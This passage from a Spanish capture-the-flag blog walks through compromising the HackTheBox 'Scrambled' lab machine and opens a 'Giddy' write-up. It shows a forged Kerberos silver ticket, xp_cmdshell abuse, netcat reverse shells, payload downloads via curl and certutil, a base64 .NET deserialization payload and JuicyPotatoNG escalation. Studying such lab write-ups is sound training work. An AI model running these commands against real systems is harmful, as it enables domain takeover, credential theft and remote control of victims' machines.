LogonDomainId:
ResourceGroupDomainSid:
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
</code></pre></div></div>

<ul>
  <li>Ahora necesitamos el hash <code class="language-plaintext highlighter-rouge">NT</code> para eso como tenemos la contraseña tenemos que convertirlo <a href="https://codebeautify.org/ntlm-hash-generator">https://codebeautify.org/ntlm-hash-generator</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b999a16500b87d17ec7f2e2a68778f05
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">ticketer</code> con el <code class="language-plaintext highlighter-rouge">SPN</code> que tenemos, el <code class="language-plaintext highlighter-rouge">hash</code> y el <code class="language-plaintext highlighter-rouge">Domain SID.</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-ticketer <span class="nt">-spn</span> MSSQLSvc/dc1.scrm.local <span class="nt">-nthash</span> b999a16500b87d17ec7f2e2a68778f05 <span class="nt">-domain-sid</span> S-1-5-21-2743207045-1827831105-2542523200 <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-domain</span> scrm.local Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating basic skeleton ticket and PAC Infos
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Customizing ticket <span class="k">for </span>scrm.local/Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_LOGON_INFO
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_CLIENT_INFO_TYPE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Signing/Encrypting final ticket
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_SERVER_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_PRIVSVR_CHECKSUM
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Ahora exportamos la variable.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
</code></pre></div></div>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Y bueno somos <code class="language-plaintext highlighter-rouge">administrator</code> a si que vamos habilitador <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar comandos y asi poder ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> enable_xp_cmdshell
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC1<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="nb">whoami
</span>output
<span class="nt">-----------</span>
scrm<span class="se">\s</span>qlsvc

NULL

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a subir el nc.exe a la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"curl 10.10.14.2/nc.exe -o C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span>
output                                                                  
<span class="nt">--------------------------------------------------------------------------------</span>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current

                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--100 28160  100 28160    0     0  85836      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- 86116

NULL                                                                    
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe -e cmd 10.10.14.2 443"</span>
</code></pre></div></div>

<ul>
  <li>La recibimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 55826
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>scrm<span class="se">\s</span>qlsvc

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="shell-as-miscsvc">Shell as miscsvc</h2>

<ul>
  <li>Vemos otro usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:<span class="se">\U</span>sers

05/11/2021  15:56    &lt;DIR&gt;          <span class="nb">.</span>
05/11/2021  15:56    &lt;DIR&gt;          ..
05/11/2021  22:28    &lt;DIR&gt;          administrator
03/11/2021  20:31    &lt;DIR&gt;          miscsvc
26/01/2020  18:54    &lt;DIR&gt;          Public
01/06/2022  14:58    &lt;DIR&gt;          sqlsvc
               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
               6 Dir<span class="o">(</span>s<span class="o">)</span>  16,013,860,864 bytes free
</code></pre></div></div>

<ul>
  <li>Vemos una vía no intencionada <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers&gt;whoami /priv
<span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacerlo por la vía intencionada si no ya seria explotar eso y listo.</p>
  </li>
  <li>
    <p>Vamos a enumerar el servicio <code class="language-plaintext highlighter-rouge">sql</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> SELECT name FROM master.sys.databases<span class="p">;</span>
name
<span class="nt">----------</span>
master

tempdb

model

msdb

ScrambleHR

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver las tablas de <code class="language-plaintext highlighter-rouge">ScrambleHR</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> <span class="k">select </span>table_name from ScrambleHR.information_schema.tables<span class="p">;</span>
table_name
<span class="nt">----------</span>
Employees

UserImport

Timesheets

SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)&gt;</span> <span class="k">select</span> <span class="k">*</span> from ScrambleHR.dbo.UserImport
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups
<span class="nt">--------</span>   <span class="nt">-----------------</span>   <span class="nt">----------</span>   <span class="nt">---------------</span>   <span class="nt">-------------</span>
MiscSvc    ScrambledEggs9900   scrm.local                90               0
</code></pre></div></div>

<ul>
  <li>Podemos usar Powershell para definir la credencial.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'scrm.local\MiscSvc'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
<span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'scrm.local\MiscSvc'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
scrm<span class="se">\m</span>iscsvc
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ganar acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; Invoke-Command <span class="nt">-ComputerName</span> dc1 <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> C:<span class="se">\T</span>emp<span class="se">\n</span>etcat.exe <span class="nt">-e</span> cmd 10.10.14.3 443 <span class="o">}</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61231
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;whoami
<span class="nb">whoami
</span>scrm<span class="se">\m</span>iscsvc

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;type C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
99e0ac7dcbc5c354ac0169f07630794d

C:<span class="se">\U</span>sers<span class="se">\m</span>iscsvc<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Vemos estos archivos interesantes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client&gt;dir
<span class="nb">dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client

05/11/2021  21:57    &lt;DIR&gt;          <span class="nb">.</span>
05/11/2021  21:57    &lt;DIR&gt;          ..
05/11/2021  21:52            86,528 ScrambleClient.exe
05/11/2021  21:52            19,456 ScrambleLib.dll
               2 File<span class="o">(</span>s<span class="o">)</span>        105,984 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  16,009,113,600 bytes free

C:<span class="se">\S</span>hares<span class="se">\I</span>T<span class="se">\A</span>pps<span class="se">\S</span>ales Order Client&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a descargarlo mediante <code class="language-plaintext highlighter-rouge">smbclient.py</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient scrm.local/miscsvc:ScrambledEggs9900@dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># shares</span>
ADMIN<span class="err">$</span>
C<span class="err">$</span>
HR
IPC<span class="err">$</span>
IT
NETLOGON
Public
Sales
SYSVOL
<span class="c"># use IT</span>
<span class="c"># cd Apps\Sales Order Client</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 <span class="nb">.</span>
drw-rw-rw-          0  Fri Nov  5 14:57:08 2021 ..
<span class="nt">-rw-rw-rw-</span>      86528  Fri Nov  5 14:57:08 2021 ScrambleClient.exe
<span class="nt">-rw-rw-rw-</span>      19456  Fri Nov  5 14:57:08 2021 ScrambleLib.dll
<span class="c"># mget *</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading ScrambleClient.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading ScrambleLib.dll
</code></pre></div></div>

<ul>
  <li>Vamos a pasarlos a una maquina <code class="language-plaintext highlighter-rouge">Windows</code> para con <code class="language-plaintext highlighter-rouge">Dnspy</code> observar el código.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe.png" />
</p>

<ul>
  <li>Si le damos en edit. vemos que esta corriendo en el puerto 4411.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/exe2.png" />
</p>

<ul>
  <li>Al parecer parece un software de ordenes en la empresa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos analizar el código para ver que es lo que pasa por detrás.</p>
  </li>
  <li>
    <p>Y bueno ya vemos que emplea <code class="language-plaintext highlighter-rouge">Serialize</code> básicamente serializa la data y podemos modificar el input con un ataque de deserialización con base64.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial.png" />
</p>

<ul>
  <li>Como dato extra si observamos en la parte del login si el usuario es scrmdev podemos entrar y al parecer aplica un Bypass vamos a entrar con ese usuario sin proporcionar contraseña.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/serial2.png" />
</p>

<ul>
  <li>Lo que vamos hacer para ganar acceso es conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> y cuando eso pase enviar una data serializada pero necesitamos general un <code class="language-plaintext highlighter-rouge">payload</code> <a href="https://github.com/pwntester/ysoserial.net/releases">https://github.com/pwntester/ysoserial.net/releases</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/yserial.png" />
</p>

<ul>
  <li>Vamos a crearlo en base64 en <code class="language-plaintext highlighter-rouge">BinaryFormatter</code> con su gadget.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/xd.png" />
</p>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos y con <code class="language-plaintext highlighter-rouge">upload_order</code> como vimos en el código vamos a enviar nuestra data serializada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content nc 10.10.11.168 4411
SCRAMBLECORP_ORDERS_V1.0.3<span class="p">;</span>
UPLOAD_ORDER<span class="p">;</span>AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA9AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBMXdVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUVNNlhGUmxiWEJjYm1WMFkyRjBMbVY0WlNBdFpTQmpiV1FnTVRBdU1UQXVNVFF1TXlBME5ETWlJRk4wWVc1a1lYSmtSWEp5YjNKRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGTjBZVzVrWVhKa1QzVjBjSFYwUlc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVmMyVnlUbUZ0WlQwaUlpQlFZWE56ZDI5eVpEMGllM2c2VG5Wc2JIMGlJRVJ2YldGcGJqMGlJaUJNYjJGa1ZYTmxjbEJ5YjJacGJHVTlJa1poYkhObElpQkdhV3hsVG1GdFpUMGlZMjFrSWlBdlBnMEtJQ0FnSUNBZ1BDOXpaRHBRY205alpYTnpMbE4wWVhKMFNXNW1iejROQ2lBZ0lDQThMM05rT2xCeWIyTmxjM00rRFFvZ0lEd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlMazlpYW1WamRFbHVjM1JoYm1ObFBnMEtQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEkrQ3c9PQs<span class="o">=</span>
ERROR_GENERAL<span class="p">;</span>Error deserializing sales order: Exception has been thrown by the target of an invocation.
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Y ganamos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61761
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
5b18e5184ded3c7a33e509daf9e06b2e

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="extra">Extra</h2>

<ul>
  <li>Vamos a explotar una vía no intencionada <a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
certutil.exe <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.3:80/JuicyPotatoNG.exe JuicyPotato.exe
<span class="k">****</span>  Online  <span class="k">****</span>
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.

PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir
dir


    </span>Directory: C:<span class="se">\T</span>emp


Mode                LastWriteTime         Length Name                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
<span class="nt">-a----</span>       01/05/2024     02:43         153600 JuicyPotato.exe        
<span class="nt">-a----</span>       30/04/2024     23:43          28160 netcat.exe             



PS C:<span class="se">\T</span>emp&gt;
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha y nos enviamos la reverse Shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; ./JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.3 443 -e cmd'</span>
./JuicyPotato.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">etcat.exe"</span> <span class="nt">-a</span> <span class="s1">'10.10.14.3 443 -e cmd'</span>
</code></pre></div></div>

<ul>
  <li>Ganamos acceso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.3] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.168] 61802
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2989]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\&gt;</span><span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\&gt;</span><span class="nb">hostname
hostname
</span>DC1

C:<span class="se">\&gt;</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Giddy (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html" rel="alternate" type="text/html" title="HackTheBox - Giddy (medium)" /><published>2024-04-26T00:00:00-06:00</published><updated>2024-04-26T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/cd0f72b791b481e72b7099668409a6a8.png" />
</p>

<ul>
  <li>En este post vamos a resolver la maquina Giddy de la plataforma de Hack The Box donde aprovechándonos de una SQL Injection vamos a robar el hash NTLMv2 de un usuario y nos podremos conectarnos con evil-winrm ala maquina para la escalada de privilegios vamos abusar de un servicio que al correrlo podemos arrancar un .exe para hacer lo que queramos pero tendremos que hacer varios bypass al Windows Defender para conseguirlo.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y servicios por el protocolo <strong>TCP</strong> de la maquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,443,3389,5985 10.129.96.140 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-26 12:49 CST
Nmap scan report <span class="k">for </span>10.129.96.140
Host is up <span class="o">(</span>0.085s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn:
|   h2
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_ssl-date: 2024-04-26T18:49:52+00:00<span class="p">;</span> <span class="nt">-7s</span> from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
